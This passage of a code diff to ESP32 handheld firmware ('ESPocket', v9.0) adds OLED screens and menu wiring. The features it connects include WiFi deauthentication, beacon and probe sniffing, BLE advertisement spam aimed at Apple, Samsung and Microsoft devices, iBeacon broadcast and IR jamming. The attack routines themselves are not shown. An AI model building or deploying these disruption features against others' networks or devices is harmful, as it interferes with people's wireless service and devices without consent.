+    if (j < 0) continue;
+    char line[24];
+    snprintf(line, sizeof(line), "%02X:%02X:%02X %4d x%u",
+             probeDevices[j].mac[3], probeDevices[j].mac[4], probeDevices[j].mac[5],
+             probeDevices[j].rssi, probeDevices[j].count);
+    display.setCursor(2, rowY); display.print(line);
+    rowY += 8;
+    if (probeDevices[j].ssid[0]) { display.setCursor(6, rowY); display.print(probeDevices[j].ssid); }
+    else { display.setCursor(6, rowY); display.print("(broadcast)"); }
+    rowY += 9;
+  }
+  display.setCursor(2, 58); display.print("BACK=stop");
+  display.display();
+}
+
+void dRfMon() {
+  rfMonitorScan();
+  display.clearDisplay();
+  hdr("RF MONITOR");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  char b[24];
+  snprintf(b, sizeof(b), "Nets: %d", rfNetworkCount);
+  display.setCursor(2, 14); display.print(b);
+  snprintf(b, sizeof(b), "Avg: %d dBm", rfAvgRssi);
+  display.setCursor(2, 24); display.print(b);
+  snprintf(b, sizeof(b), "Max: %d  Min: %d", rfStrongest, rfWeakest);
+  display.setCursor(2, 34); display.print(b);
+  display.setCursor(2, 46); display.print("Ch:");
+  int maxU = 1;
+  for (int i = 0; i < 14; i++) if (rfChanUsage[i] > maxU) maxU = rfChanUsage[i];
+  for (int i = 0; i < 13; i++) {
+    int x = 20 + i * 8;
+    int h = (rfChanUsage[i] * 6) / maxU;
+    display.drawRect(x, 50, 6, 10, WHITE);
+    if (h > 0) display.fillRect(x + 1, 50 + (10 - h), 4, h, WHITE);
+  }
+  display.setCursor(2, 62); display.print("BACK");
+  display.display();
+}
+
+// BLE screens
+void dBleScan() {
+  if (bleScanRunning && millis() - sceneStartMs > 4000) {
+    if (bleScan) { bleScan->stop(); bleScan->clearResults(); }
+    bleScanRunning = false;
+    bleScanDone = true;
+    Serial.printf("[BLE] scan done, %d devices\n", bleDevCount);
+    bleDeinit();
+  }
+  display.clearDisplay();
+  hdr("BLE SCAN");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  char sb[24]; snprintf(sb, sizeof(sb), "Dev: %d", bleDevCount);
+  display.setCursor(2, 14); display.print(sb);
+  if (bleScanRunning) {
+    display.setCursor(2, 24); display.print("Scanning...");
+    int dots = (animFrame / 4) % 4;
+    for (int i = 0; i < dots; i++) display.print(".");
+  } else if (bleDevCount == 0) {
+    display.setCursor(2, 30); display.print("No BLE devices");
+  } else {
+    const int visRows = 3, rowH = 12, baseY = 24;
+    int targetOff = (bleSel >= 2) ? (bleSel - 1) : 0;
+    if (targetOff + visRows > bleDevCount) targetOff = bleDevCount - visRows;
+    if (targetOff < 0) targetOff = 0;
+    smTick((float)targetOff);
+    int idxLo = (int)floorf(smPos) - 1, idxHi = (int)floorf(smPos) + visRows + 1;
+    for (int i = idxLo; i <= idxHi; i++) {
+      if (i < 0 || i >= bleDevCount) continue;
+      float yf = baseY + (i - smPos) * rowH;
+      if (yf < baseY - rowH || yf > baseY + visRows * rowH) continue;
+      int y = (int)roundf(yf);
+      bool isSel = (i == bleSel);
+      if (isSel) { display.fillRoundRect(2, y, SCR_W - 4, rowH - 2, 4, WHITE); display.setTextColor(BLACK); }
+      else       { display.drawRoundRect(2, y, SCR_W - 4, rowH - 2, 4, WHITE); display.setTextColor(WHITE); }
+      char b[18]; snprintf(b, sizeof(b), "%.13s", bleDevs[i].name);
+      display.setCursor(6, y + 3); display.print(b);
+      char r[8]; snprintf(r, sizeof(r), "%d", bleDevs[i].rssi);
+      display.setCursor(SCR_W - 30, y + 3); display.print(r);
+    }
+  }
+  display.setCursor(2, 58); display.print("BACK=stop");
+  display.display();
+}
+
+void dBleSpam() {
+  unsigned long now = millis();
+  if (bleSpamRunning) bleSpamTick();
+  display.clearDisplay();
+  hdr("BLE SPAM");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  const char* typeName[] = {"Apple","Samsung","Microsoft"};
+  display.setCursor(2, 14); display.print("Type: ");
+  display.print(typeName[bleSpamType]);
+  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", bleSpamCount);
+  display.setCursor(2, 26); display.print(b);
+  unsigned long el = (now - bleSpamStart) / 1000;
+  display.setCursor(2, 38);
+  if (el > 0) { snprintf(b, sizeof(b), "Rate: %lu/s", bleSpamCount / el); display.print(b); }
+  display.setCursor(2, 50);
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  for (int i = 0; i < 4; i++) {
+    int x = SCR_W - 24 + (i % 2) * 10;
+    int y = 14 + (i / 2) * 10;
+    if ((animFrame / 3 + i) % 4 < 2) display.fillCircle(x, y, 3, WHITE);
+    else                              display.drawCircle(x, y, 3, WHITE);
+  }
+  display.setCursor(2, 58); display.print("BACK=stop");
+  display.display();
+}
+
+void dBleIBeacon() {
+  unsigned long now = millis();
+  display.clearDisplay();
+  hdr("IBEACON");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  display.setCursor(2, 14); display.print("Broadcasting...");
+  unsigned long el = (now - bleIbStart) / 1000;
+  char b[24]; snprintf(b, sizeof(b), "Uptime: %lus", el);
+  display.setCursor(2, 26); display.print(b);
+  display.setCursor(2, 38); display.print("UUID:");
+  display.setCursor(2, 50); display.print("E2C56DB5-DFFB...");
+  int cx = SCR_W / 2 + 20, cy = 44;
+  int r = (animFrame % 20);
+  if (r > 4) display.drawCircle(cx, cy, r, WHITE);
+  display.fillCircle(cx, cy, 3, WHITE);
+  display.setCursor(2, 58); display.print("BACK=stop");
+  display.display();
 }
 
 void dMock() {
@@ -1204,6 +1787,7 @@ void handleUp(){
     case S_LED_FX:if(fxSel>0)fxSel--;break;
     case S_LED_MUS:if(lmSel>0)lmSel--;break;
     case S_SET:if(setSel>0)setSel--;break;
+    case S_BLE_SCAN:if(bleSel>0)bleSel--;break;
   }
 }
 void handleDown(){
@@ -1223,6 +1807,7 @@ void handleDown(){
     case S_LED_FX:if(fxSel<FX_COUNT-1)fxSel++;break;
     case S_LED_MUS:if(lmSel<LM_COUNT-1)lmSel++;break;
     case S_SET:if(setSel<SET_COUNT-1)setSel++;break;
+    case S_BLE_SCAN:if(bleSel<bleDevCount-1)bleSel++;break;
   }
 }
 void handleSelect(){
@@ -1248,10 +1833,18 @@ void handleSelect(){
       break;
     case S_WIFI_H:
       if(wifiHSel==0){netSel=0;wifiScanDone=false;wifiScanRunning=false;goToScene(S_WIFI_SCAN);}
-      else{mockTitle="WIFI_OPS";mockSub=WIFI_H_M[wifiHSel];mockReturnScene=S_WIFI_H;goToScene(S_MOCK);}
+      else if(wifiHSel==1){beaconStart();goToScene(S_BEACON);}
+      else if(wifiHSel==2){snifferStart();goToScene(S_PROBE);}
+      else if(wifiHSel==3){rfLastScanMs=0;rfScanRunning=false;goToScene(S_RFMON);}
       break;
     case S_BT_H:
-      mockTitle="BT_OPS";mockSub=BT_H_M[btHSel];mockReturnScene=S_BT_H;goToScene(S_MOCK);
+      if (btHSel == 0) { bleStartScan(); goToScene(S_BLE_SCAN); }
+      else if (btHSel == 1) { bleStartSpam(); goToScene(S_BLE_SPAM); }
+      else if (btHSel == 2) { bleStartIBeacon(); goToScene(S_BLE_IBEACON); }
+      else {
+        mockTitle = "BT_OPS"; mockSub = BT_H_M[btHSel];
+        mockReturnScene = S_BT_H; goToScene(S_MOCK);
+      }
       break;
     case S_IR_H:
       if(irSel==0){irLearnSlot=0;irrecv.enableIRIn();irrecv.resume();goToScene(S_IR_LEARN);}
@@ -1266,10 +1859,8 @@ void handleSelect(){
       }
       break;
     case S_WIFI_TARGET:
-      if (wifiActSel == 0) {
-        deauthStart(targetNet);
-        goToScene(S_DEAUTH);
-      } else {
+      if (wifiActSel == 0) { deauthStart(targetNet); goToScene(S_DEAUTH); }
+      else {
         mockTitle=WIFI_ACT_M[wifiActSel];
         mockSub=NETS[targetNet].ssid;
         mockReturnScene=S_WIFI_TARGET;
@@ -1312,8 +1903,7 @@ void handleBack(){
     case S_IR_H:goToScene(S_HIDDEN);break;
     case S_WIFI_SCAN:
       WiFi.scanDelete();
-      WiFi.mode(WIFI_OFF);
-      WiFi.disconnect(true);
+      WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
       wifiScanRunning = false;
       goToScene(S_WIFI_H);
       break;
@@ -1324,10 +1914,21 @@ void handleBack(){
     case S_IR_TX:goToScene(S_IR_H);break;
     case S_IR_JAM:irJamming=false;goToScene(S_IR_H);break;
     case S_IR_TVBG:goToScene(S_IR_H);break;
-    case S_DEAUTH:
-      deauthStop();
-      goToScene(S_WIFI_TARGET);
+    case S_DEAUTH:deauthStop();goToScene(S_WIFI_TARGET);break;
+    case S_BEACON:beaconStop();goToScene(S_WIFI_H);break;
+    case S_PROBE:snifferStop();goToScene(S_WIFI_H);break;
+    case S_RFMON:
+      WiFi.scanDelete(); WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+      rfScanRunning = false;
+      goToScene(S_WIFI_H);
       break;
+    case S_BLE_SCAN:
+      if (bleScan) bleScan->stop();
+      bleDeinit();
+      goToScene(S_BT_H);
+      break;
+    case S_BLE_SPAM:bleStopSpam();goToScene(S_BT_H);break;
+    case S_BLE_IBEACON:bleStopIBeacon();goToScene(S_BT_H);break;
   }
 }
 
@@ -1399,7 +2000,7 @@ void checkOverheat(){
 // ============================================================
 void setup(){
   Serial.begin(115200);delay(300);
-  Serial.println("\n[BOOT] ESPocket v8.2");
+  Serial.println("\n[BOOT] ESPocket v9.0");
 
   Wire.begin(OLED_SDA,OLED_SCL);
   Wire.setClock(400000);
@@ -1424,6 +2025,16 @@ void setup(){
   irLoadAll();
   Serial.printf("[IR] %d slots valid\n",irCountValid());
 
+  // Battery ADC
+  analogSetAttenuation(ADC_11db);
+  analogSetPinAttenuation(BATT_ADC_PIN, ADC_11db);
+  analogReadResolution(12);
+  pinMode(BATT_ADC_PIN, INPUT);
+  delay(100);
+  lastBattRead = millis() - 3000;
+  batteryUpdate();
+  Serial.printf("[BATT] %.2f V  %d%%\n", battVoltage, batteryPct);
+
   randomSeed(analogRead(0));
   lastTempC=readTempC();
   Serial.printf("[HEAP] %u B | Temp %.1f C\n",(unsigned)ESP.getFreeHeap(),lastTempC);
@@ -1438,6 +2049,7 @@ void loop(){
   scanSerial();
   scanTouch();
   checkOverheat();
+  batteryUpdate();
   if(currentScene==S_BT_SEARCH&&(now-sceneStartMs)>3000){devSel=0;goToScene(S_BT_DEV);}
   if(now-lastDraw>=FRAME_MS){
     lastDraw=now;
@@ -1470,6 +2082,12 @@ void loop(){
       case S_IR_JAM:dIrJam();break;
       case S_IR_TVBG:dIrTvbg();break;
       case S_DEAUTH:dDeauth();break;
+      case S_BEACON:dBeacon();break;
+      case S_PROBE:dProbe();break;
+      case S_RFMON:dRfMon();break;
+      case S_BLE_SCAN:dBleScan();break;
+      case S_BLE_SPAM:dBleSpam();break;
+      case S_BLE_IBEACON:dBleIBeacon();break;
       case S_SET:dSet();break;
       case S_ABOUT:dAbout();break;
       case S_OVERHEAT:dOverheat();break;
